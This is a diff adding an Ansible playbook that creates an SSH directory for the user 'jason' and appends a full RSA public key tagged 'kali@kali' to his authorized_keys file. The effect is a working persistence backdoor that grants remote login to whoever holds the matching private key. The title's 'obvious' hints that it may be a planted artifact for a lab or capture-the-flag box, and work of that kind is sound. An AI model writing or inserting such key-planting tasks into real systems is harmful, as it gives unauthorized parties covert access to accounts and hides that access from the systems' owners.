@@ -1,0 +1,12 @@
+---
+- name: "add obvious ssh keys for jason user"
+  hosts: localhost
+  connection: local
+  tasks:
+    - name: "set up .ssh directory"
+      shell: "mkdir /home/jason/.ssh; touch /home/jason/.ssh/authorized_keys; chmod 644 /home/jason/.ssh/authorized_keys"
+      become: true
+      become_method: su
+      become_user: jason
+    - name: "add ssh key"
+      shell: "echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDXwTlvmyqnlDqyI7gM5g2lPpXcuHhNAgOsEv/3B3t8SXhTd3322wtvduplgiJKW2ifsdPG0rjUexQ5epY0uB1ZNC6wma4cojCyZUbLErAuXmr7alx70t1YA0Nfm2hX7hUJIJQTBSXYgDXKnzjXGz77eF7mMLWtVhv5rvFeF2cNSD6FVGoxDjPQ0NbOGOcy/YirYzsXFQ3PE/pzGv1yymh9vIfzZ/BmeQNtgQibTWC+ZKOBpeiyajn9k4Di4VHx/Wf+BrHyqw2IiCXhe/EjzY2VkbcXlGMv3rBc7RSKSWxMtFrndMn+kPmmsuVOzG/iv85vXMgDg4L1AXiTkzMqmfwOxoFF0BwSomidDu6U53+zbOtuqWzkR4tQZ9PMcpOXl+O6limSf4pTgBwTa3yso/qFu51oru5CqBoxR/+EKQSM7nVOScaYox6NWwqapqu5afwhYDxCfZuUI7CCKtbD/2jJff4J+8Yb+0USThEz0/r3kc5KLEd3f+xf9Vx4LlljN10= kali@kali' >> /home/jason/.ssh/authorized_keys"
